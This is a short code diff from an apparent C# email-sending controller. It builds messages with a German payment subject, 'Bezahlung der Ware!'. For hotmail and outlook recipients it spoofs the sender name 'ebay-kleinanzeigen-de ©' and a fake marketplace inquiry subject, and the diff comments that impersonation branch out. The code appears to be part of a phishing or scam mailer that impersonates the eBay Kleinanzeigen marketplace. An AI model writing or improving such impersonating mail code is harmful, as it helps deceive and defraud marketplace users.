@@ -73,12 +73,12 @@ public class SenderController : ControllerBase
 
 		var subject = "Bezahlung der Ware! #834891";
 
-		if (email.Contains("hotmail") || email.Contains("outlook"))
+		/*if (email.Contains("hotmail") || email.Contains("outlook"))
 		{
 			displayName = "ebay-kleinanzeigen-de  ©";
 
 			subject = $"Nutzer-Anfrage zu deiner Anzeige#{_orderNumber} .";
-		}
+		}*/
 
 		var message = new MailMessage(_senderEmail, email, subject, body)
 		{
